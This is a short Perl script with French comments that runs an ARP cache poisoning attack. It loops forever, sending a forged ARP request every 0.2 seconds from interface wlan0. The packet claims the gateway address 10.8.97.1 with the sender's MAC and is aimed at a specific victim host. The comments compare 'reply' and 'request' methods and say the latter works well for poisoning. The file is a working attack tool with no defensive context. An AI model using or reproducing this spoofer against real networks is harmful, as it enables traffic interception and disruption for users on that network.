#!/usr/bin/perl -w
use Net::ARP;
use strict;
use Time::HiRes;
$| = 1;
my $pktcount = 0;
for (;;)
{
	# Methode "reply", pas très efficase sur certains systèmes, ils attendent une reponse ARP uniquement après une demande.
	# Net::ARP::send_packet('wlan0',                 # Device
	#              	 '10.8.97.1',          # Source IP
	#                '0.0.0.0',          # Destination IP
 	#                '94:db:c9:47:dc:6d',  # Source MAC
	#                '64:27:37:98:80:47',  # Destinaton MAC
	#                'reply');             # ARP operation

	# Methode "request", packet ARP vraiment USELESS (On fait une demande d'adresse MAC mais on ne l'envoi pas en BROADCAST.) 
	# Mais visiblement très efficace pour faire du ARP Cache Poisoning. 
	Net::ARP::send_packet('wlan0',                 # Device
            '10.8.97.1',          # Source IP
            '10.8.108.55',          # Destination IP
            '94:db:c9:47:dc:6d',  # Source MAC
            '20:10:7a:f9:8d:d6',  # Destinaton MAC
            'request');             # ARP operation
	Time::HiRes::sleep (0.2);
	$pktcount++;
	print("Packet ARP Envoyé : # $pktcount\n");
}
